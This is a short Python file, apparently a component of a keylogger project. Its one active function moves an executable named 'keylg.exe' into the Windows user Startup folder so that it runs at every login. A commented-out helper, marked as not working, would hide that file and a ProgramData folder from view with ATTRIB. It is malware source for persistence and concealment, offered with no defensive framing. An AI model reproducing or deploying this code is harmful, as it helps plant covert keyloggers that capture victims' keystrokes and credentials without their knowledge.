import subprocess


# moves script form current directory to startup
def move_app_to_startup():
    subprocess.run(
        r'move .\keylg.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"',
        shell=True)

# hidding files (******DOESNT WORK WITH STARTUP!******)
# def hide_files():
#     subprocess.run(
#         r'ATTRIB +H /s /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylg.exe"',
#         shell=True)
# subprocess.run(r'ATTRIB +H /s /d C:\ProgramData\ProgramData', shell=True)
